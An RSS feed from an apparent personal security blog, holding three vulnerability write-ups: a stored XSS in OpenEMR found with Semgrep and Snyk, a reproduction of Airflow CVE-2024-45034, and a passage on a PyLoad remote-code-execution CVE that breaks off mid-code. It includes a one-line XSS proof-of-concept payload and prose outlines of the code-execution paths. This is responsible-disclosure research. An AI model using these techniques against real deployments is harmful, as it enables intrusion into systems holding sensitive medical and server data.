<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Bayesian Blogs</title>
        <link>http://localhost:1313/posts/</link>
        <description>Recent content in Posts on Bayesian Blogs</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <lastBuildDate>Wed, 19 Mar 2025 19:37:34 -0700</lastBuildDate>
        <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>I Ran Free SAST Tools on OpenEMR and Found a CVE</title>
            <link>http://localhost:1313/posts/cve-2025-30161/</link>
            <pubDate>Wed, 19 Mar 2025 19:37:34 -0700</pubDate>
            
            <guid>http://localhost:1313/posts/cve-2025-30161/</guid>
            <description>&lt;p&gt;&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2025-30161&#34;&gt;CVE-2025-30161&lt;/a&gt;(&lt;a href=&#34;https://github.com/openemr/openemr/security/advisories/GHSA-59rv-645x-rg6p&#34;&gt;Github Advisory&lt;/a&gt;) is a stored XSS vulnerability in the bronchitis form component of OpenEMR. It allows anyone with access to edit a bronchitis form to inject malicious javascript payload into the form and run the payload in the context of other users including administrators.&lt;/p&gt;
&lt;h2 id=&#34;background&#34;&gt;Background&lt;/h2&gt;
&lt;p&gt;I am a big proponent of open source static analysis engines like &lt;a href=&#34;https://github.com/semgrep/semgrep&#34;&gt;Semgrep&lt;/a&gt; and tools like &lt;a href=&#34;https://docs.snyk.io/scan-with-snyk/snyk-code&#34;&gt;Snyk Code&lt;/a&gt; that provide a free tier. One of the biggest selling point for both Semgrep and Snyk is that they allow writing your own rules. I have written many Semgrep rules at my job or otherwise and have found the rule language easy to learn and understand, while also providing very powerful features such as taint tracking and autofixing. Snyk&amp;rsquo;s &lt;a href=&#34;https://docs.snyk.io/scan-with-snyk/snyk-code/snyk-code-custom-rules/create-custom-rule&#34;&gt;custom rule&lt;/a&gt; support is currently in preview as of the time of writing. Both Semgrep and Snyk also have a set of pre-built rules. In the Semgrep world they are called community rules and can be found in this &lt;a href=&#34;https://github.com/semgrep/semgrep-rules&#34;&gt;repo&lt;/a&gt;.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30161">CVE-2025-30161</a>(<a href="https://github.com/openemr/openemr/security/advisories/GHSA-59rv-645x-rg6p">Github Advisory</a>) is a stored XSS vulnerability in the bronchitis form component of OpenEMR. It allows anyone with access to edit a bronchitis form to inject malicious javascript payload into the form and run the payload in the context of other users including administrators.</p>
<h2 id="background">Background</h2>
<p>I am a big proponent of open source static analysis engines like <a href="https://github.com/semgrep/semgrep">Semgrep</a> and tools like <a href="https://docs.snyk.io/scan-with-snyk/snyk-code">Snyk Code</a> that provide a free tier. One of the biggest selling point for both Semgrep and Snyk is that they allow writing your own rules. I have written many Semgrep rules at my job or otherwise and have found the rule language easy to learn and understand, while also providing very powerful features such as taint tracking and autofixing. Snyk&rsquo;s <a href="https://docs.snyk.io/scan-with-snyk/snyk-code/snyk-code-custom-rules/create-custom-rule">custom rule</a> support is currently in preview as of the time of writing. Both Semgrep and Snyk also have a set of pre-built rules. In the Semgrep world they are called community rules and can be found in this <a href="https://github.com/semgrep/semgrep-rules">repo</a>.</p>
<h2 id="experimental-setup">Experimental Setup</h2>
<p>While writing rules is fun, I am a lazy security researcher who wants quick <del>profits</del> CVEs. So I decided to perform an experiment. Here are the steps of my experiment:</p>
<ol>
<li>Pick a few open source repositories.</li>
<li>Clone them to my laptop and run Semgrep with its community rules.</li>
<li>Fork them to my GitHub account and run Snyk (Snyk&rsquo;s GitHub integration requires the user to have write access to the repos and the easiest way to do this was to fork it to my account).</li>
<li>Analyze the results.</li>
<li>Find ___ CVEs.</li>
</ol>
<p>This seemed like an easy enough experiment. I anticipated the result analysis to take some time since the probability of having a lot of noise was quite high.</p>
<p>The first repository I picked was <a href="https://www.open-emr.org/">OpenEMR</a>. From their homepage:</p>
<blockquote>
<p>OpenEMR is the most popular open source electronic health records and medical practice management solution. OpenEMR is a community of passionate volunteers and contributors dedicated to guarding OpenEMR‚Äôs status as a free, open source software solution for medical practices with a commitment to openness, kindness and cooperation.</p></blockquote>
<p>The motivation behind picking this was a talk I attended where the speaker spoke about security issues in EMR (Electronic Medical Record) systems. The speaker emphasized on the need to ensure the security of these systems as they contain a lot of sensitive information.</p>
<h2 id="related-work">Related Work</h2>
<p>OpenEMR has been scrutinized many times in the past. Some references:</p>
<ul>
<li><a href="https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf">Report by Project Insecurity</a></li>
<li><a href="https://www.sonarsource.com/blog/openemr-remote-code-execution-in-your-healthcare-system/">RCE in OpenEMR</a></li>
<li><a href="https://www.talosintelligence.com/vulnerability_reports/TALOS-2020-1179">SQL injecion in phpGACL</a> (These CVEs are not in OpenEMR itself, but OpenEMR was used to demonstrate the PoC)</li>
</ul>
<p>Due to these reports, the developers on OpenEMR have worked very hard to make the codebase quite secure, which is very respectable and great for users, but not good for me as my chances of finding vulnerabilities are greatly reduced üôÅ.</p>
<h2 id="running-semgrep">Running Semgrep</h2>
<p>OpenEMR is a large code base. Running <code>cloc</code> on only git tracked files shows 6116 text files and over 1.7 million lines of code.</p>
<pre tabindex="0"><code>cloc --list-file=&lt;(git ls-files)

    6116 text files.

github.com/AlDanial/cloc v 2.02  T=22.94 s (239.0 files/s, 97010.4 lines/s)
--------------------------------------------------------------------------------
Language                      files          blank        comment           code
--------------------------------------------------------------------------------
PHP                            3717          86837         263709         637104
SVG                             274            106          33465         411322
SQL                             123           7386           7446         321356
HTML                            217           3294           7123         132878
JavaScript                      284          11920          15960          82732
CSS                              91           5006           1071          42703
... snipped ...
--------------------------------------------------------------------------------
SUM:                           5482         122999         346123        1755972
--------------------------------------------------------------------------------
</code></pre><p>The Semgrep scan result was also incredibly large:</p>
<pre tabindex="0"><code>Ran 1362 rules on 4588 files: 3021 findings.
</code></pre><p>3021 findings?! Boy, have a found a gold mine! Or did I? Spoiler alert: I did not. Going over 3000+ findings is an impossible feat. I read some of the findings and quickly determined that most of them were false positives.</p>
<p>I was interested in learning how many findings are reported per rule so I asked ChatGPT to write a script for me to count the findings by rule from the sarif output. These were the top rules:</p>
<pre tabindex="0"><code>php.lang.security.taint-unsafe-echo-tag.taint-unsafe-echo-tag: 2243
javascript.express.security.audit.xss.mustache.explicit-unescape.template-explicit-unescape: 123
php.lang.security.unlink-use.unlink-use: 99
php.lang.security.tainted-user-input-in-php-script.tainted-user-input-in-php-script: 97
php.lang.security.injection.tainted-sql-string.tainted-sql-string: 92
php.lang.security.injection.tainted-filename.tainted-filename: 72
php.lang.security.unserialize-use.unserialize-use: 61
php.lang.security.injection.printed-request.printed-request: 41
php.lang.security.exec-use.exec-use: 38
generic.secrets.security.detected-bcrypt-hash.detected-bcrypt-hash: 26
javascript.browser.security.insecure-document-method.insecure-document-method: 22
</code></pre><p>Reading the OpenEMR code, I found that the developers have applied robust protections for common issues such as XSS, SQL injection, and code injection. For XSS mitigation, they added many <a href="https://github.com/openemr/openemr/blob/master/library/htmlspecialchars.inc.php">helper functions</a> and used them wherever user input was used. For SQL injection, they have correctly used prepared statements and parameterized queries. For code injection, they have ensured to not use any user input while making system calls.</p>
<p>The 2243 findings for <code>php.lang.security.taint-unsafe-echo-tag.taint-unsafe-echo-tag</code> were mostly reported for code like</p>
<pre tabindex="0"><code>&lt;span class=\&#34;text\&#34;&gt;&lt;?php echo xlt(&#39;Total active reminders before update&#39;) . \&#34;: \&#34; . text($update_rem_log[&#39;total_pre_active_reminders&#39;]); ?&gt;&lt;/span&gt;&lt;br /&gt;&#34;
</code></pre><p>The <code>xlt</code> function is from the aforementioned helper functions designed to prevent XSS. Glancing through many of them, I quickly got bored and decided that this rule is noisy. In the rule writer&rsquo;s and Semgrep&rsquo;s defense, it is very unlikely that a generic rule can correctly determine that a custom XSS protection mechanism is being used here.</p>
<p>Similarly I looked through the 92 SQL injection findings and found them to be noise too. So much for &ldquo;easy CVEs&rdquo;&hellip;</p>
<p>I ended up writing a script to ignore a bunch of rules and then re-ran Semgrep:</p>
<pre tabindex="0"><code>exclude_rules=(
  &#34;php.lang.security.taint-unsafe-echo-tag.taint-unsafe-echo-tag&#34;
  &#34;php.lang.security.unlink-use.unlink-use&#34;
  &#34;javascript.express.security.audit.xss.mustache.explicit-unescape.template-explicit-unescape&#34;
  &#34;php.lang.security.curl-ssl-verifypeer-off.curl-ssl-verifypeer-off&#34;
  &#34;javascript.browser.security.insecure-document-method.insecure-document-method&#34;
  &#34;php.lang.security.tainted-path-traversal.tainted-path-traversal&#34;
  &#34;php.lang.security.tainted-user-input-in-php-script.tainted-user-input-in-php-script&#34;
  &#34;php.lang.security.injection.printed-request.printed-request&#34;
  &#34;php.lang.security.exec-use.exec-use&#34;
  &#34;php.lang.security.injection.tainted-sql-string.tainted-sql-string&#34;
  &#34;php.lang.security.injection.tainted-filename.tainted-filename&#34;
  &#34;php.laravel.security.laravel-path-traversal.laravel-path-traversal&#34;
)

semgrep_command=&#34;semgrep scan --config auto . -o semgrep-results.txt --severity ERROR --severity WARNING&#34;

for rule in &#34;${exclude_rules[@]}&#34;; do
  semgrep_command+=&#34; --exclude-rule $rule&#34;
done

eval &#34;$semgrep_command&#34;%
</code></pre><p>This drastically reduced the findings to 165. This I could go over. Having a better understanding of the OpenEMR codebase and its various security protection, I was able to rule out (<em>drumroll please</em>) all 165 findings as false positives.</p>
<p>I spent almost 20 hours doing this and had nothing to show for it&hellip;</p>
<h2 id="enter-snyk">Enter Snyk</h2>
<p>I had almost given up on finding an issue in OpenEMR (and with this experiment in general). I had other &ldquo;easy CVE&rdquo; ideas which seemed very enticing. However, I decided not to give in to my habit of jumping from one idea to another <em>(&hellip; cough &hellip; all my incomplete coding projects &hellip; cough &hellip; from the past 8 years &hellip; cough &hellip;)</em>. On a whim, I decided to run Snyk.</p>
<p>Snyk had considerably lesser findings. Only ~ 640. (Side note: for some unknown reasons, I decided to delete the original project, and therefore rescanned it today for this blog. Therefore, the original finding is understandably missing from this result.)</p>
<p><img src="/snyk-ss.png" alt="snyk-output"></p>
<p>Many of these findings were also XSS and SQL injections - similar to Semgrep - which can again be attributed to the custom helper functions. At this point I was ready to walk away from this and go to my next &ldquo;easy CVE&rdquo; idea ‚ú® fuzzing ‚ú®.</p>
<p>By now, it was well into the evening, and not wanting to start a new experiment, I told myself I will spend as much time as I had before I had to start preparing dinner to quickly look through the High findings.</p>
<h2 id="cve-2025-30161">CVE-2025-30161</h2>
<p>A few minutes into reviewing the High findings, I found code that used <code>echo</code> without the helper functions. Could it be??? üò±. Well, dinner prep went for a toss as I started looking into this finding.</p>
<p>Not too long after, I confirmed that this code was indeed vulnerable to stored XSS. The finding was in the bronchitis form component of OpenEMR. There are 2 sources of XSS in the bronchitis form:</p>
<ul>
<li>Bronchitis Ops Appearance</li>
<li>Bronchitis Oropharynx Appearance</li>
</ul>
<p>The issue is caused by improper sanitization of user input in these lines:</p>
<ul>
<li><a href="https://github.com/openemr/openemr/blob/17ca5539bafcdc25a9042ebc14480552e07867e4/interface/forms/bronchitis/view.php#L102-L103">1</a></li>
<li><a href="https://github.com/openemr/openemr/blob/17ca5539bafcdc25a9042ebc14480552e07867e4/interface/forms/bronchitis/view.php#L303-L304">2</a></li>
</ul>
<p>The code here is like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">td</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#a6e22e">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bronchitis_oropharynx_appearance&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;?php echo
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">stripslashes(</span><span style="color:#e6db74">$obj[&#34;bronchitis_oropharynx_appearance&#34;]</span><span style="color:#e6db74">);?&gt;&#34;</span> <span style="color:#a6e22e">size</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;15&#34;</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">td</span><span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><p>where <code>$obj[&quot;bronchitis_oropharynx_appearance&quot;]</code> is user controlled data. When a payload like <code>&quot; onfocus=&quot;alert(1)&quot;</code> is passed as the user input, the <code>&lt;td&gt;</code> is rendered like this which leads to XSS:</p>
<pre tabindex="0"><code>&lt;td&gt;&lt;input type=&#34;text&#34; name=&#34;bronchitis_oropharynx_appearance&#34; value=&#34;&#34; onfocus=&#34;alert(1)&#34; size=&#34;15&#34;&gt;&lt;/td&gt;
</code></pre><p>The issue is the same with Bronchitis Ops Appearance.</p>
<h2 id="fix">Fix</h2>
<p>The OpenEMR developers <a href="https://github.com/openemr/openemr/pull/7945">fixed</a> this issue very promptly by applying the <code>attr()</code> helper function to the vulnerable sources. The fix has been added to OpenEMR 7.0.3.</p>
<h2 id="conclusion">Conclusion</h2>
<p>There may be &ldquo;easy CVEs&rdquo;. Perhaps I chose the wrong repo. After this success, I have continued the experiment with a few more repos and I have nothing to report yet. As I have mentioned previously, I am lazy and therefore I do not spend too much time looking into a finding, which, along with my general lack of skill in crafting exploits from SAST findings, could have lead to me missing vulnerabilities. If you are good at such sports, this experiment may produce better results for you.</p>
<p>I should note here that I have only tried somewhat popular repos with large-ish number of stars and forks. It is possible that not-so-popular repos would lead to more results. Even though I keep saying &ldquo;easy CVEs&rdquo;, I find myself more interested in finding CVEs in software that have a decent user base. The same also applies to my target selection for my fuzzing escapades. I will write about that in some time (or won&rsquo;t - depending on my learnings and success&hellip;). Or maybe I will have more success with this experiment. Stay tuned! Thank you for reading.</p>
<h2 id="timeline">Timeline</h2>
<ul>
<li>January 23, 2025: Reported issue to OpenEMR security team.</li>
<li>January 28, 2025: Issue fixed by OpenEMR security team.</li>
<li>March 1, 2025: Notified by OpenEMR security team that the issue is fixed.</li>
<li>March 19, 2025: Requested a CVE for this issue through GitHub.</li>
<li>March 20, 2025: CVE-2025-30161 assigned.</li>
<li>&ndash;, x, 2025: OpenEMR 7.0.3 released, blog published.</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Not a CVE: Using Airflow via Docker Can Lead to Arbitrary Code Execution</title>
            <link>http://localhost:1313/posts/reversing-airflow-patches/</link>
            <pubDate>Sun, 12 Jan 2025 00:08:05 -0700</pubDate>
            
            <guid>http://localhost:1313/posts/reversing-airflow-patches/</guid>
            <description>&lt;p&gt;I have been reading quite a few blogs about analyzing patches for CVEs and generating exploits based on the difference in code between the vulnerable and the fixed versions (&lt;code&gt;diff&lt;/code&gt;). One of my favorites is &lt;a href=&#34;https://www.assetnote.io/resources/research/two-bytes-is-plenty-fortigate-rce-with-cve-2024-21762&#34;&gt;this blog&lt;/a&gt; from the folks at Assetnote about a CVE in Fortigate. While this level of reverse engineering is waaaay beyond what I can even think of attempting, I also read articles about simpler exercises, such as &lt;a href=&#34;https://blog.securelayer7.net/arbitrary-code-execution-in-apache-airflow/&#34;&gt;this&lt;/a&gt; for a CVE in Apache Airflow - which is a direct inspiration for this blog.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>I have been reading quite a few blogs about analyzing patches for CVEs and generating exploits based on the difference in code between the vulnerable and the fixed versions (<code>diff</code>). One of my favorites is <a href="https://www.assetnote.io/resources/research/two-bytes-is-plenty-fortigate-rce-with-cve-2024-21762">this blog</a> from the folks at Assetnote about a CVE in Fortigate. While this level of reverse engineering is waaaay beyond what I can even think of attempting, I also read articles about simpler exercises, such as <a href="https://blog.securelayer7.net/arbitrary-code-execution-in-apache-airflow/">this</a> for a CVE in Apache Airflow - which is a direct inspiration for this blog.</p>
<p><a href="https://airflow.apache.org/">Apache Airflow</a> is an open-source platform for creating, scheduling, and managing complex workflows and data pipelines programmatically. Apache Airflow uses <a href="https://airflow.apache.org/docs/apache-airflow/stable/core-concepts/dags.html">Directed Acyclic Graphs</a> (DAGs) to define and schedule workflows as a series of interdependent tasks, ensuring a clear execution order without cycles. DAGs are Python-based, allowing dynamic task definitions and flexible scheduling. DAGs are defined in <code>$AIRFLOW_HOME/dags</code> folder. Airflow also has a plugin manager built-in that can integrate external features to its core by adding files in the <code>$AIRFLOW_HOME/plugins</code> folder.</p>
<p>Looking at the list of Airflow CVEs, I settled on exploring <a href="https://www.cvedetails.com/cve/CVE-2024-45034/">CVE-2024-45034</a> which is an arbitrary code execution issue.</p>
<h2 id="cve-2024-45034">CVE-2024-45034</h2>
<p><a href="https://www.cvedetails.com/cve/CVE-2024-45034/">CVE-2024-45034</a> is an arbitrary code execution vulnerability which affects Airflow &lt; 2.10.1. The description states the CVE &ldquo;allows DAG authors to add local settings to the DAG folder and get it executed by the scheduler, where the scheduler is not supposed to execute code submitted by the DAG author&rdquo;. The patch for this CVE is added in <a href="https://github.com/apache/airflow/pull/41672">this pull request</a>. The changes are made to <a href="https://github.com/apache/airflow/blob/2.9.3/airflow/settings.py">settings.py</a>. The patch appears quite simple:</p>
<ul>
<li>In the vulnerable version, the <code>DAGS_FOLDER</code> and the <code>PLUGINS_FOLDER</code> are added to <code>sys.path</code> before executing <code>import_local_settings</code>.</li>
<li>In the patched version, the <code>DAGS_FOLDER</code> and the <code>PLUGINS_FOLDER</code> folder are added to <code>sys.path</code> after executing <code>import_local_settings</code>.</li>
</ul>
<p>One can make an educated guess that <code>$AIRFLOW_HOME/dags</code> maps to <code>DAGS_FOLDER</code> and <code>$AIRFLOW_HOME/plugins</code> maps to <code>PLUGINS_FOLDER</code>. It can be inferred from the patch that something interesting happens in <code>import_local_settings</code> which deserves deeper investigation. Looking at <a href="https://github.com/apache/airflow/blob/81845de9d95a733b4eb7826aaabe23ba9813eba3/airflow/settings.py#L474"><code>import_local_settings</code></a> we see this code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">import_local_settings</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Import airflow_local_settings.py files to allow overriding any configs in settings.py file.&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">import</span> airflow_local_settings
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">...</span>
</span></span></code></pre></div><p>In the vulnerable version, it can be seen that since the <code>DAGS_FOLDER</code> and the <code>PLUGINS_FOLDER</code> are appended to <code>sys.path</code> before executing <code>import_local_settings</code>. Therefore, adding a file named <code>airflow_local_settings.py</code> to one of these folders will lead to it being executed by <code>import_local_settings</code>. This would lead to arbitrary code execution. The <code>DAGS_FOLDER</code> and the <code>PLUGINS_FOLDER</code> are meant to be writable by the users - thereby allowing any user to exploit this vulnerability by adding malicious code to a file named <code>airflow_local_settings.py</code> in either the <code>DAGS_FOLDER</code> or the <code>PLUGINS_FOLDER</code></p>
<p>I created a simple <code>airflow_local_settings.py</code> file in my <code>$AIRFLOW_HOME/dags</code> folder with this line <code>print(&quot;This code runs when the module is imported.&quot;)</code>. I then restarted Airflow. Looking at the logs, I could see that this line was printed when the containers started. The CVE description states that the code will be executed by the scheduler. However, I noticed it was executed by the webserver, the worker, and the triggerer as well. More on this later.</p>
<p><img src="/airflow-rev-1.png" alt="local-settings-imported"></p>
<p><img src="/airflow-rev-2.png" alt="code-exec-1"></p>
<p><img src="/airflow-rev-3.png" alt="code-exec-2"></p>
<h2 id="testing-on-a-fixed-version">Testing on a fixed version</h2>
<p>After reproducing the CVE in Airflow 2.9, I decided to see what happens if I try the same thing on a patched version. So I set up Airflow 2.10.1 using <a href="https://airflow.apache.org/docs/apache-airflow/stable/howto/docker-compose/index.html">the Docker setup instructions</a>. Then I performed the same steps I tried with 2.9. I observed that the code from <code>import_local_settings</code> is still executed by the scheduler. It was however not run from the webserver, the worker, and the triggerer as with 2.9.</p>
<p>As the CVE specifically mentioned the scheduler as the component that runs the arbitrary code and this also happened in the fixed version, I thought the CVE was not completely fixed. Therefore I reported this to Apache Airflow security.</p>
<h2 id="response-from-apache">Response from Apache</h2>
<p>The Apache security team was very prompt in their response. They let me know within a few days that my finding was invalid. They told me in polite words to RTFM. In my excitement to report my findings, I had neglected to read the <a href="https://airflow.apache.org/docs/apache-airflow/stable/security/security_model.html">security model documentation for Apache Airflow</a>, specifically this line &ldquo;In case of Local Executor and DAG File Processor running as part of the Scheduler, DAG authors can execute arbitrary code on the machine where scheduler is running&rdquo;. As I was running my Airflow through Docker, this statement applies to my setup. This was also why I noticed that for me the arbitrary code was running on all containers and not just the scheduler.</p>
<p>Between the time of me reporting this and now, it appears that <a href="https://airflow.apache.org/docs/apache-airflow/stable/howto/docker-compose/index.html">the Docker setup instructions</a> page has been updated to show a warning at the top stating that this way of using Airflow provides no security guarantees and therefore should not be used in production. They recommend using a <a href="https://airflow.apache.org/docs/helm-chart/stable/index.html">Kubernetes setup</a> instead.</p>
<h2 id="conclusion">Conclusion</h2>
<p>This was an entertaining exercise. Reverse engineering a patch was quite fun. The added excitement that I may have found another CVE was quite a highlight, albeit only for a few days. However the main lesson I learnt from this excursion was that I should read the documentation properly before reporting clearly documented security risks as new issues to PSIRTs. I myself work on PSIRT and encounter reports quite often where I have to inform reporters what they are describing is a misconfiguration or a known documented risk. So it is ironic that I don&rsquo;t follow my own advice. Oh well, you live and you learn.</p>
<p>Thank you for reading, and Happy New Year!</p>
]]></content>
        </item>
        
        <item>
            <title>CVE-2024-47821: Remote Code Execution in PyLoad</title>
            <link>http://localhost:1313/posts/cve-2024-47821/</link>
            <pubDate>Fri, 25 Oct 2024 17:00:09 -0800</pubDate>
            
            <guid>http://localhost:1313/posts/cve-2024-47821/</guid>
            <description>&lt;p&gt;I found my first CVE! &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-47821&#34;&gt;CVE-2024-47821&lt;/a&gt; (&lt;a href=&#34;https://github.com/pyload/pyload/security/advisories/GHSA-w7hq-f2pj-c53g&#34;&gt;GitHub Advisory&lt;/a&gt;) is a remote code execution vulnerability in &lt;a href=&#34;https://pyload.net/&#34;&gt;PyLoad&lt;/a&gt;. PyLoad is an open source download manager written in Python. The folder &lt;code&gt;~/.pyload/scripts&lt;/code&gt; on the server where PyLoad is installed has scripts which are run when certain actions are completed, for e.g. a download is finished. By downloading a executable file to a folder in &lt;code&gt;~/.pyload/scripts&lt;/code&gt; and performing the respective action, remote code execution can be achieved. A file can be downloaded to such a folder by changing the download folder to a folder in &lt;code&gt;~/.pyload/scripts&lt;/code&gt; path and using the &lt;code&gt;/flashgot&lt;/code&gt; API to download the file.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>I found my first CVE! <a href="https://www.cve.org/CVERecord?id=CVE-2024-47821">CVE-2024-47821</a> (<a href="https://github.com/pyload/pyload/security/advisories/GHSA-w7hq-f2pj-c53g">GitHub Advisory</a>) is a remote code execution vulnerability in <a href="https://pyload.net/">PyLoad</a>. PyLoad is an open source download manager written in Python. The folder <code>~/.pyload/scripts</code> on the server where PyLoad is installed has scripts which are run when certain actions are completed, for e.g. a download is finished. By downloading a executable file to a folder in <code>~/.pyload/scripts</code> and performing the respective action, remote code execution can be achieved. A file can be downloaded to such a folder by changing the download folder to a folder in <code>~/.pyload/scripts</code> path and using the <code>/flashgot</code> API to download the file.</p>
<p>CVSS v4.0 Base Score: 9.4 (<a href="https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H">AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H</a>)</p>
<p>I rated PR:H as admin access is required to change the dowload folder to <code>~/.pyload/scripts</code>. Once that is done, no privileges are required to send the requests to trigger RCE.</p>
<h2 id="a-history-lesson">A history lesson</h2>
<p>I first encountered PyLoad in the Hack the Box PC machine (I <a href="https://www.baishya.xyz/posts/htb-pc/">wrote</a> about writing a script to solve the machine in an automatable fashion). I then analyzed some CVEs in PyLoad in a previous <a href="https://baishya.xyz/posts/pyload-cves/">post</a>. While analyzing the CVEs, I built a decent understanding of how the APIs and Web UI of PyLoad work.</p>
<p>Since I had already spent some time looking at PyLoad code, I decided to choose PyLoad as my target to find a CVE - and then proceeded to not do anything with respect to security research for the next few months (partially due to some life events - but mostly because I was lazy). Eventually, I somehow dragged myself back to the realm of security research - and I decided to take another look at PyLoad.</p>
<p>PyLoad uses a library <code>js2py</code> to execute JavaScript in Python. This was the source of a previous remote code execution CVE (CVE-2023‚Äì0297). The TL;DR is that PyLoad did not disable <code>js2py</code>&rsquo;s <code>pyimport</code> feature and therefore allowed importing of Python libraries like <code>os</code> into <code>js2py.eval_js()</code>. This allowed an attacker to send a crafted request with a command injection payload in the <code>jk</code> parameter to the <code>/flash/addcrypted2</code> API and achieve remote code execution. To fix this issue, <code>pyimport</code> was disabled for PyLoad.</p>
<h2 id="cve-2024-28397">CVE-2024-28397</h2>
<p>I had previously learnt about recursive attribute lookups in Python - and I wondered if this could be used to find a module through recursive lookup in <code>js2py</code>, which allowed executing code. Turns out the answer is Yes. However:</p>
<ol>
<li>This was already discovered (<a href="https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape">CVE-2024-28397</a>)</li>
<li>The payload was way beyond something I could have come up with.</li>
</ol>
<p>This was good news to me - since I could try the payload provided in the repo against PyLoad and see if it worked. I quickly got a script ready to call the <code>/flash/addcrypted2</code> with the payload provided in <code>jk</code> parameter to test if PyLoad is vulnerable to this CVE. On sending the request, I encountered a strange error: <code>403: Forbidden</code>. Huh? I did not see any authentication checks in the API code, so I was confused why I got this error.</p>
<h2 id="bypassing-local_check">Bypassing <code>local_check</code></h2>
<p>To understand the source of this error, I took another look at the API code. The function for this API has a <code>local_check</code> decorator:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#a6e22e">@bp.route</span>(<span style="color:#e6db74">&#34;/flash/addcrypted2&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>], endpoint<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;addcrypted2&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@local_check</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">addcrypted2</span>():
</span></span><span style="display:flex;"><span>    package <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;package&#34;</span>, flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;source&#34;</span>, flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;referer&#34;</span>))
</span></span><span style="display:flex;"><span>    )
</span></span></code></pre></div><p>The decorator is defined like this</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">local_check</span>(func):
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@wraps</span>(func)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">wrapper</span>(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
</span></span><span style="display:flex;"><span>        remote_addr <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;REMOTE_ADDR&#34;</span>, <span style="color:#e6db74">&#34;0&#34;</span>)
</span></span><span style="display:flex;"><span>        http_host <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;HTTP_HOST&#34;</span>, <span style="color:#e6db74">&#34;0&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> remote_addr <span style="color:#f92672">in</span> (<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#e6db74">&#34;::ffff:127.0.0.1&#34;</span>, <span style="color:#e6db74">&#34;::1&#34;</span>, <span style="color:#e6db74">&#34;localhost&#34;</span>) <span style="color:#f92672">or</span> http_host <span style="color:#f92672">in</span> (
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;127.0.0.1:9666&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;[::1]:9666&#34;</span>,
</span></span><span style="display:flex;"><span>        ):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> func(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
